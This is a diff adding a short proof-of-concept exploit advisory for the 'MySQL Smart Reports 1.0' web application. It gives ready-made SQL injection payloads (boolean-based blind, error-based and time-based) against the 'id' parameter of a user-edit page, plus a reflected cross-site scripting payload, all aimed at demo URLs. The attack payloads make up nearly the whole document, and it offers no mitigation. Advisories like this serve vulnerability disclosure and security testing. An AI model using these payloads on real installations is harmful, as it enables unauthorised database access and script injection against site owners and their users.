@@ -1,0 +1,43 @@
+# Exploit Title: MySQL Smart Reports 1.0 - SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/mysql-smart-reports-online-report-generator-with-existing-data/16836503
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : It is actually a post request sent by the user to update.
+                You do not need to use post data. You can injection like
+GET method.
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+     Type : boolean-based blind
+     Demo :
+http://test.com/MySQLSmartReports/system-settings-user-edit2.php?add=true&id=1
+  Payload : add=true&id=9' RLIKE (SELECT (CASE WHEN (8956=8956) THEN 9 ELSE
+0x28 END))-- YVFC
+
+     Type : error-based
+     Demo :
+http://test.com/MySQLSmartReports/system-settings-user-edit2.php?add=true&id=1
+  Payload : add=true&id=9' AND (SELECT 3635 FROM(SELECT
+COUNT(*),CONCAT(0x716a6a7671,(SELECT
+(ELT(3635=3635,1))),0x7176627a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HEMo
+
+     Type : AND/OR time-based blind
+     Demo :
+http://test.com/MySQLSmartReports/system-settings-user-edit2.php?add=true&id=1
+  Payload : add=true&id=9' AND SLEEP(5)-- mcFO
+
+
+====================================================
+# PoC : XSS :
+
+  Payload :
+http://test.com/MySQLSmartReports/system-settings-user-edit2.php?add=true&id='
+</script><script>alert(1)</script>‘;
